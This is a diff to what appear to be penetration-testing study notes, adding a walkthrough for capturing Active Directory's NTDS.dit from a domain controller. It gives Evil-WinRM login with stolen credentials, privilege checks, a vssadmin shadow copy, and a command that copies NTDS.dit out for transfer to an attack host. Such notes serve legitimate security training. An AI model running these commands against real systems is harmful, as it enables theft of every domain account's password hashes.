@@ -2394,7 +2394,85 @@ In this example, NetExec uses SMB to attempt a login as user bwilliamson (-u) wi
 
 > **NOTE:** Understanding what artifacts an attack leaves behind is key to providing impactful remediation advice. On any Windows system, administrators can use Event Viewer to review Security logs and examine recorded actions. This insight can guide the implementation of stronger security controls and support post-breach investigations.
 
-Once credentials are obtained, we can attempt to gain remote access to the Domain Controller and extract the NTDS.dit file, which contains password hashes for all domain users.
+Once credentials are obtained, we can attempt to gain remote access to the Domain Controller and extract the `NTDS.dit` file, which contains password hashes for all domain users.
+
+</details>
+
+</details>
+
+<details>
+<summary><h3>Capturing NTDS.dit</h3></summary>
+
+NT Directory Services (NTDS) is the directory service used with AD to find & organize network resources. The `NTDS.dit` file, located at `%systemroot%\NTDS` on domain controllers, is the core database of Active Directory—“.dit” stands for Directory Information Tree. This file contains all domain usernames, password hashes, and critical schema data. If an attacker captures it, they could potentially compromise every account in the domain.
+
+<details>
+<summary><h4>Connecting to a DC with Evil-WinRM</h4></summary>
+
+We can connect to a target DC using the credentials we captured.
+
+```bash
+evil-winrm -i <DC IP>  -u <USERNAME> -p '<PASSWORD>'
+```
+
+> Evil-WinRM connects to a target using the Windows Remote Management service combined with the PowerShell Remoting Protocol to establish a PowerShell session with the target.
+
+</details>
+
+<details>
+<summary><h4>Checking local group membership</h4></summary>
+
+Once connected, we can check to see what privileges this user has. 
+
+```bash
+*Evil-WinRM* PS C:\> net localgroup
+```
+
+We also will want to check what domain privileges we have.
+
+```bash
+*Evil-WinRM* PS C:\> net user <USERNAME>
+```
+
+We're checking whether the account has administrative privileges. To copy the `NTDS.dit` file, the account must have local administrator (Administrators group) or domain administrator (Domain Admins group) — or equivalent — privileges.
+
+This account has both Administrators and Domain Administrator rights which means we can do just about anything we want, including making a copy of the `NTDS.dit` file.
+
+</details>
+
+<details>
+<summary><h4>Creating shadow copy of C:</h4></summary>
+
+We can use vssadmin to create a [Volume Shadow Copy](https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (VSS) of the C: drive or whatever volume the admin chose when initially installing AD.
+
+```bash
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
+```
+
+Expected output
+
+```bash
+# vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+# (C) Copyright 2001-2013 Microsoft Corp.
+
+# Successfully created shadow copy for 'C:\'
+#     Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
+#     Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+```
+
+> It is very likely that NTDS will be stored on C: as that is the default location selected at install, but it is possible to change the location.
+
+> We use VSS for this because it is designed to make copies of volumes that may be read & written to actively without needing to bring a particular application or system down.
+
+</details>
+
+<details>
+<summary><h4>Copying NTDS.dit from the VSS</h4></summary>
+
+We can then copy the `NTDS.dit` file from the volume shadow copy of the C: drive to another location on the system, preparing it for transfer to our attack host.
+
+```bash
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
 
 </details>
 
